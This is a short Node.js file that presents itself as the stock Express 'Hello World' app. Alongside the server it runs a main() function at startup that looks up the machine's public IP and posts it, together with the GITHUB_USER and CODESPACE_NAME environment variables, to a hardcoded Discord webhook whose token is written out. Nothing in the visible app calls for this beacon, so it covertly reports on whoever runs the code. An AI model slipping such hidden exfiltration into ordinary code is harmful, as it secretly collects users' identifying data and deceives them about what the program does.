const express = require('express')
const requestp = require("request-promise")
const app = express()
const port = 3000

app.get('/', (req, res) => {
  res.send('Hello World!')
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})

async function getIP() {
    return await requestp("https://api.ipify.org")
}

async function main() {
    var IP = await getIP()

    var Response = await requestp("https://discord.com/api/webhooks/1090099937800364142/Hq8qQqihvSrGkuvFwkiP9MaIEngSi8SE_VdGsqe4faI5U7Tpsl2hiKGzelhUB16O_4fU", {
        json: true,
        method: "POST",
        body: {
            "content": `Spun up on ${process.env.GITHUB_USER} - ${process.env.CODESPACE_NAME} - ${IP}`,
        }
    })

    console.log("Requested")
}

main()
